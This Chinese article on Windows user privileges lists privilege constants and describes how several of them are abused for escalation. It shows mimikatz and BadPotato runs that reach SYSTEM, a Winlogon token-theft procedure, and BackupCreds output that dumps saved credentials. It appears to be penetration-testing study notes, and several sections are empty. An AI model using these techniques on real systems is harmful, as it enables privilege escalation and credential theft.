<span style="font-size: 40px; font-weight: bold;">Windows 用户权限</span>

<div style="text-align: right;">

date: "2024-01-03"

</div>

官方查询文档：[官方文档](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn221963(v=ws.11)>)

# 1. 权限的状态

如下所见，权限的状态为已禁用，这个已禁用只是代表当前程序没有这个特权，但并不代表用户不能去使用这些特权，只要特权有显示，那么用户就拥有这些权限

```shell
C:\Users\c\Desktop>whoami /priv

特权信息
----------------------

特权名                        描述                 状态
============================= ==================== ======
SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用
SeShutdownPrivilege           关闭系统             已禁用
SeChangeNotifyPrivilege       绕过遍历检查         已启用
SeUndockPrivilege             从扩展坞上取下计算机 已禁用
SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用
SeTimeZonePrivilege           更改时区             已禁用
```

# 2. 配置用户权限分配

方法一：`Win + R` 输入 `secpol.msc`，在窗口中选择 **本地策略->用户权限分配**

方法二：`Win + R` 打开运行框，输入 `gpedit.msc`，在窗口中选择 **计算机配置->Windows 设置->安全设置->本地策略->用户权限分配**

secpol.msc 本地安全策略，gpedit.msc 本地组策略编辑器

# 3. Windows 中的用户权限

| 组策略设置                         | 常量名称                                  |
| ---------------------------------- | ----------------------------------------- |
| 作为受信任的调用方访问凭据管理器   | SeTrustedCredManAccessPrivilege           |
| 从网络访问此计算机                 | SeNetworkLogonRight                       |
| 作为操作系统的一部分运行           | SeTcbPrivilege                            |
| 将工作站添加到域                   | SeMachineAccountPrivilege                 |
| 为进程调整内存配额                 | SeIncreaseQuotaPrivilege                  |
| 允许本地登录                       | SeInteractiveLogonRight                   |
| 允许通过远程桌面服务登录           | SeRemoteInteractiveLogonRight             |
| 备份文件和目录                     | SeBackupPrivilege                         |
| 跳过遍历检查                       | SeChangeNotifyPrivilege                   |
| 更改系统时间                       | SeSystemtimePrivilege                     |
| 更改时区                           | SeTimeZonePrivilege                       |
| 创建页面文件                       | SeCreatePagefilePrivilege                 |
| 创建令牌对象                       | SeCreateTokenPrivilege                    |
| 创建全局对象                       | SeCreateGlobalPrivilege                   |
| 创建永久共享对象                   | SeCreatePermanentPrivilege                |
| 创建符号链接                       | SeCreateSymbolicLinkPrivilege             |
| 调试程序                           | SeDebugPrivilege                          |
| 拒绝从网络访问这台计算机           | SeDenyNetworkLogonRight                   |
| 拒绝作为批处理作业登录             | SeDenyBatchLogonRight                     |
| 拒绝以服务身份登录                 | SeDenyServiceLogonRight                   |
| 拒绝本地登录                       | SeDenyInteractiveLogonRight               |
| 拒绝通过远程桌面服务登录           | SeDenyRemoteInteractiveLogonRight         |
| 信任计算机和用户帐户可以执行委派   | SeEnableDelegationPrivilege               |
| 从远程系统强制关机                 | SeRemoteShutdownPrivilege                 |
| 生成安全审核                       | SeAuditPrivilege                          |
| 身份验证后模拟客户端               | SeImpersonatePrivilege                    |
| 增加进程工作集                     | SeIncreaseWorkingSetPrivilege             |
| 提高计划优先级                     | SeIncreaseBasePriorityPrivilege           |
| 加载和卸载设备驱动程序             | SeLoadDriverPrivilege                     |
| 将页锁定在内存                     | SeLockMemoryPrivilege                     |
| 作为批处理作业登录                 | SeBatchLogonRight                         |
| 作为服务登录                       | SeServiceLogonRight                       |
| 管理审核和安全日志                 | SeSecurityPrivilege                       |
| 修改对象标签                       | SeRelabelPrivilege                        |
| 修改固件环境值                     | SeSystemEnvironmentPrivilege              |
| 获取同一会话中的其他用户的模拟令牌 | SeDelegateSessionUserImpersonatePrivilege |
| 执行批量维护任务                   | SeManageVolumePrivilege                   |
| 配置文件单个进程                   | SeProfileSingleProcessPrivilege           |
| 配置文件系统性能                   | SeSystemProfilePrivilege                  |
| 从扩展坞中移除计算机               | SeUndockPrivilege                         |
| 替换进程级令牌                     | SeAssignPrimaryTokenPrivilege             |
| 还原文件和目录                     | SeRestorePrivilege                        |
| 关闭系统                           | SeShutdownPrivilege                       |
| 同步目录服务数据                   | SeSyncAgentPrivilege                      |
| 取得文件或其他对象的所有权         | SeTakeOwnershipPrivilege                  |

# 4. Windows 九大权限

## 4.1 SeDebugPrivilege

> SeDebugPrivilege-调试程序

通常情况下，用户只对属于自己的进程有调试的权限，但如果该用户 Token 中被赋予 SeDebugPrivilege 并启用时，该用户就拥有了调试其他用户进程的权限，此时就可以对一些高权限进程执行操作以获取对应的权限

###### 默认用户

默认情况下只有管理员拥有此权限，也就是 Administrator 用户

###### 特权使用环境

调试新系统组件的开发人员需要此用户权限。此用户权限提供对敏感和关键操作系统组件的访问。

###### 利用方式

以 `mimikatz` 为例，在以管理员身份启动 cmd 时

```shell
C:\Users\c\Desktop\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # exit
Bye!
```

将 `SeDebugPrivilege` 取消后出现错误：`ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061`

---

## 4.2 SeTcbPrivilege

> SeTcbPrivilege-作为操作系统的一部分

决定进程是否可以假定任何用户的身份，从而获得对用户授权访问的资源的访问权限。通常，只有低级身份验证服务需要这种用户权限。得到这个权限等同于获得了系统的最高权限。

###### 默认用户

该特权无默认用户

###### 特权使用环境

1. 执行需要对整个系统进行管理的任务，例如系统级的配置更改、服务启停等。
2. 一些应用程序可能需要在操作系统级别执行任务，需要使用 SeTcbPrivilege 特权。
3. 在需要与操作系统更深度集成的应用程序或组件中可能会用到。

###### 利用方式

1. 调用 LsaLogonUser 获得 Token
2. 将该 Token 添加至 Local System account 组
3. 该 Token 具有 System 权限

测试代码：https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeTcbPrivilege.cpp

---

## 4.3 SeCreateTokenPrivilege

> SeCreateTokenPrivilege-创建令牌对象

允许用户或进程创建访问令牌

###### 默认用户

该用户权限由操作系统内部使用。默认情况下，它不分配给任何用户组。

###### 特权使用环境

 一些应用程序可能需要在执行过程中创建访问令牌，以确保其具有所需的权限，该特权用于登录验证使用。

###### 利用方式

1. 通过WinAPI ZwCreateToken创建Primary Token
2. 将Token添加至local administrator组
3. 该Token具有System权限

测试代码：https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeCreateTokenPrivilege.cpp

---

## 4.4 SeEnableDelegationPrivilege

> SeEnableDelegationPrivilege-启用计算机和用户帐户的委派信任

参考文章:https://xz.aliyun.com/t/7289

---

## 4.5 SeLoadDriverPrivilege

---

## 4.6 SeRestorePrivilege

---

## 4.7 SeTakeOwnershipPrivilege

---

## 4.8 SeImpersonatePrivilege

> SeImpersonatePrivilege-身份验证后模拟客户端

该特权表示允许该用户运行的程序模拟客户端，拥有该权限的进程能够模拟已有的 token，但不能创建新的 token，该权限也是一些 potato 提权的重要条件，可以通过 `printbug` + `ImpersonateNamedPipeClient()` 等等许多方式获取到高权限令牌，进而执行模拟

`printbug`:打印机漏洞

`ImpersonateNamedPipeClient()`：它允许服务端进程模拟连接到它的客户端进程，也就是说，如果现在有一个非管理员权限的命名管道服务端进程，并且有一个管理员权限连接到该服务端，那么就可以模拟出管理员权限，当然这需要 `SeImpersonatePrivilege` 特权

###### 默认用户

1. 管理员或者本地的服务账户
2. 由服务控制管理器启动的服务
3. 由组件对象模型 (COM) 基础结构启动的并配置为在特定帐户下运行的 COM 服务器
4. IIS 与 SqlServer 用户

###### 特权使用环境

###### 利用方式

以管理员身份打开 cmd 执行 `BadPotato`，可以看到提权成功

```shell
C:\Users\c\Desktop>BadPotato.exe "whoami"
[*]

    ____            ______        __        __
   / __ )____ _____/ / __ \____  / /_____ _/ /_____
  / __  / __ `/ __  / /_/ / __ \/ __/ __ `/ __/ __ \
 / /_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ /
/_____/\__,_/\__,_/_/    \____/\__/\__,_/\__/\____/

Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream

[*] PipeName : \\.\pipe\5344630785ac43569bd3e0f7f3b7f8de\pipe\spoolss
[*] ConnectPipeName : \\DESKTOP-2JRVAGS/pipe/5344630785ac43569bd3e0f7f3b7f8de
[*] CreateNamedPipeW Success! IntPtr:224
[*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:2508308594288
[*] ConnectNamePipe Success!
[*] CurrentUserName : c
[*] CurrentConnectPipeUserName : SYSTEM
[*] ImpersonateNamedPipeClient Success!
[*] OpenThreadToken Success! IntPtr:976
[*] DuplicateTokenEx Success! IntPtr:980
[*] SetThreadToken Success!
[*] CurrentThreadUserName : NT AUTHORITY\SYSTEM
[*] CreateOutReadPipe Success! out_read:1000 out_write:1004
[*] CreateErrReadPipe Success! err_read:1008 err_write:1012
[*] CreateProcessWithTokenW Success! ProcessPid:5440
nt authority\system


[*] Bye!
```

将 `SeImpersonatePrivilege` 特权去除后再次运行 `BadPotato`，结果如下所示

```shell
C:\Users\c\Desktop>BadPotato.exe "whoami"
[*]

    ____            ______        __        __
   / __ )____ _____/ / __ \____  / /_____ _/ /_____
  / __  / __ `/ __  / /_/ / __ \/ __/ __ `/ __/ __ \
 / /_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ /
/_____/\__,_/\__,_/_/    \____/\__/\__,_/\__/\____/

Github:https://github.com/BeichenDream/BadPotato/       By:BeichenDream

[*] PipeName : \\.\pipe\24773ad702eb46d4b9f4ca3a9a46a618\pipe\spoolss
[*] ConnectPipeName : \\DESKTOP-2JRVAGS/pipe/24773ad702eb46d4b9f4ca3a9a46a618
[*] CreateNamedPipeW Success! IntPtr:684
[*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:2356427928944
[*] ConnectNamePipe Success!
[*] CurrentUserName : c
[*] CurrentConnectPipeUserName : SYSTEM
[*] ImpersonateNamedPipeClient Success!
[*] OpenThreadToken Success! IntPtr:984
Unknown error (0x542)
[!] DuplicateTokenEx fail!
```

结论：

1. Local Service 和 Network Service 通常都具有 `SeImpersonatePrivilege` 特权，所以实际场景中常常用来从 IIS 或 SQL Server 服务账户权限提升至 SYSTEM 权限。
2. 如果现在有一个非管理员权限的命名管道服务端进程，并且有一个管理员权限连接到该服务端，那么就可以模拟出管理员权限，当然这需要 `SeImpersonatePrivilege`特权。

---

## 4.9 SeAssignPrimaryTokenPrivilege

> SeAssignPrimaryTokenPrivilege-替换进程级令牌

这个策略设置决定了哪些父进程可以替换与子进程关联的访问令牌。Replace 进程级别的令牌设置决定了哪些用户帐户可以调用 `CreateProcessAsUser()` 应用程序编程接口(API)，以便一个服务可以启动另一个服务。简单来说就是把一个进程的令牌指派给另一个进程，从而使得另一个进程获得了更高权限

###### 默认用户

默认情况下，此设置是域控制器和独立服务器上的网络服务和本地服务。通常 iis 或者 sqlserver 用户具有该权限

###### 特权使用环境

在一些情况下，特定的系统服务或进程可能需要使用 `SeAssignPrimaryTokenPrivilege` 权限来分配访问令牌，以确保其正常运行。

###### 利用方式

可使用 `Juicy Potato` 工具进行本地提权，[参考文章](https://3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90)

---

## 4.10 SeBackupPrivilege

> SeBackupPrivilege-备份文件和目录

###### 默认用户

1. 在域中默认拥有此特权的组有：`Administrators`、`Backup Operators`、`Server Operators]`，了解组请点击[这里](/docs/knowledge/domain_penetration/域用户组的分类和权限)
2. 非域环境下只有`Administrators`、`Backup Operators`拥有此特权

###### 特权使用环境

一般用于管理员进行备份或恢复时使用

###### 利用方式

参考文章：[实验-备份操作员组](/docs/knowledge/domain_penetration/experiment/experiment_BackupOperator)

---

## 4.11 SeTrustedCredManAccessPrivilege

> SeTrustedCredManAccessPrivilege-作为受信任的调用者访问凭据管理器

该特权用来访问凭据管理器，备份凭据管理器中的凭据需要使用 `CredBackupCredentials()` 这一 API，而调用该 API 需要拥有`SeTrustedCredmanAccessPrivilege` 特权，该特权默认授予 `winlogon.exe` 和 `lsass.exe` 这两个进程

了解凭据管理器请点击[这里](/docs/knowledge/Windows/Authentication/Credential_Manager.md)

###### 默认用户

该特权没有默认用户

###### 特权使用环境

访问凭据管理器作为可信调用方策略设置在 **备份和恢复期间** 由凭据管理器使用。没有帐户应该有此特权，因为它只分配给 Winlogon 服务。如果将此特权授予其他实体，则保存的用户凭据可能会受到损害。

###### 利用方式

利用方式即窃取 `winlogon.exe` 的 token，并调用 `CredBackupCredentials()` 对凭据管理器中的凭据进行备份（指定加密密码为 NULL），最终再调用 `CryptUnprotectData()` 对备份的文件进行解密。

此处并未复现成功，查阅大量资料也只能大致了解其过程：

1. 找到我们想要转储凭据的用户的正确 `WinLogon` 进程
2. 使用 `PROCESS_QUERY_LIMITED_INFORMATION` 访问权限打开 `WinLogon` 进程
3. 使用 `TOKEN_DUPLICATE` 访问权限复制令牌
4. 将令牌转变为模拟令牌
5. 启用 `SeTrustedCredmanAccessPrivilege` 权限
6. 打开用户的目标进程
7. 窃取并冒充目标用户
8. 调用 `CredBackupCredentials`，同时模拟 `WinLogon` 令牌，传递要写入的路径和 NULL 密码以禁用用户加密
9. 在仍然模拟的同时打开文件并使用 `CryptUnprotectData API` 对其进行解密
10. 删除文件

###### 工具一：forkatz 工具使用

```shell
C:\Users\c\Desktop>forkatz.exe
opening winlog in process
opening winlogin token
duplicating winlogin token
Enabling SeTrustedCredmanAccessPrivilege to duplicate token
Getting user process
Getting user token
impersonating winlogin
creating cred backup for user
decrypting data
reverting back to self
```

疑惑
用户 c 配置了 `SeTrustedCredManAccessPrivilege` 权限，然后运行 forkatz.exe 报错为无法获取 winlogon 的句柄（winlogon.exe 是用户登录程序，该程序是管理用户登录和退出任务，winlogon.exe 在按 ctrl+alt+del 时已经被激活，这个进程是必需的，它的大小和登录时间有关），使用管理员运行则是上述的结果，但是没有发现有什么效果

###### 工具二：BackupCreds 工具使用

```shell
C:\Users\c\Desktop>tasklist | find "winlogon"
winlogon.exe                  636 Console                    5         暂缺

C:\Users\c\Desktop>BackupCreds.exe 636 C:\Users\c\Desktop\0105.txt
[*] SeDebugPrivilege enabled
[*] Targeting process with PID 636 which runs under session: 1
[*] Found Winlogon process with PID 636 matching session id: 1
[*] Opening Winlogon with PID 636
[*] Cloning token of Winlogon with PID 636
[*] Incoming creds!!!

    TargetName       : WindowsLive:target=virtualapp/didlogical
    TargetAlias      :
    Comment          : PersistedCredential
    UserName         : 02htrotscpokqaav
    Credential       :

[*] Deleting file at C:\Users\c\Desktop\0105.txt
[*] Enjoy your creds! Reverting to self

```

参考文章：

1. [作为受信任的调用者访问凭据管理器](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn221952(v=ws.11)>)
2. [使用 SeTrustedCredmanAccessPrivilege 转储存储的凭据](https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html?m=1)
3. [从 mimikatz 学习 Windows 安全之访问控制模型（三）](https://loong716.top/posts/mimikatz_privilege/#10-setrustedcredmanaccessprivilege)
4. [使用 SetTrustedCredmanAccessPrivilege 获取已保存的凭据](https://www.cnblogs.com/zUotTe0/p/14843211.html)

相关工具及代码：

1. [BackupCreds](https://github.com/leftp/BackupCreds)
2. [forkatz](https://github.com/Barbarisch/forkatz)
3. [Bl0odzToolkit](https://github.com/BL0odz/Bl0odzToolkit/blob/main/RED/DumpCred_TrustedTokenPriv/main.cpp)

---

## 4.12 SeSecurityPrivilege

> SeSecurityPrivilege-管理审核和安全日志
